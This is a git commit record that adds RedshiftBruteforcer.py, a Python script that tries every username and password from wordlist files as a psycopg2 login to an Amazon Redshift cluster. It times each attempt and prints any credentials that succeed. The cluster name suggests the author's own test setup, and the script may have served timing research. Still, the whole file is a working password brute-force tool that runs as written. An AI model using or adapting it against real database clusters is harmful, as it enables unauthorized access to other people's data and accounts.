ba300411ad274a212254bef768a6e7c563fb64fd
Matias Sequeira <matiassequeira@gmail.com>
2020-10-15 12:32:16 -0400

    p

---
+++ RedshiftBruteforcer.py
@@ -0,0 +1,68 @@
+import psycopg2
+import time
+import argparse
+
+host='test-redshift-cluster.cxj2rpawsz0p.us-east-1.redshift.amazonaws.com'
+# users_file='users.txt'
+users_filename='redshift_users_8_len_short.txt'
+passwords_filename='redshift_passwords_8_len_short.txt'
+
+def bruteforce(user, password):
+    raw_user_list= [user] if user else open(f'{users_filename}',"r")
+    raw_password_list= [password] if password else open(f'{passwords_filename}',"r")
+
+    user_list=list()
+    for user in raw_user_list:
+        user_list.append(user.strip())
+
+    password_list=list()
+    for password in raw_password_list:
+        password_list.append(password.strip())
+
+    
+    iterations=0
+    total_time = time.time()
+    for current_user in user_list:
+        for current_password in password_list:
+            # print(f'Testing password: {current_password}')
+            iterations+=1
+            try:
+                trial_start=time.time()
+                engine = psycopg2.connect(
+                    database="dev",
+                    user=current_user,
+                    password=current_password,
+                    host=host,
+                    port='5439'
+                )
+            except Exception as e:
+                trial_elapsed = time.time() - trial_start
+                print(f'Credentials {current_user}/{current_password} took {trial_elapsed}')
+                continue
+            
+            trial_elapsed = time.time() - trial_start
+            print(f'Found: {current_password}')
+            print(f'Credentials {current_user}/{current_password} took {trial_elapsed}')
+            # break
+
+    total_elapsed = time.time() - total_time
+    print(f'\nTotal bruteforcing time: {total_elapsed} for {iterations} trials')
+    print(f'\nMean bruteforcing time: {total_elapsed/iterations}')
+
+if __name__ == '__main__':
+    
+    parser = argparse.ArgumentParser(description='Bruteforcer')
+    parser.add_argument('-u','--user',
+                        help="Fixed user to test",
+                        default=None
+                        )
+    parser.add_argument('-p','--password',
+                        help="Fixed pass to test",
+                        default=None
+                        )    
+    options= parser.parse_args()       
+
+    if options.user:
+        print(f'Testing user: {options.user}')
+
+    bruteforce(options.user, options.password)
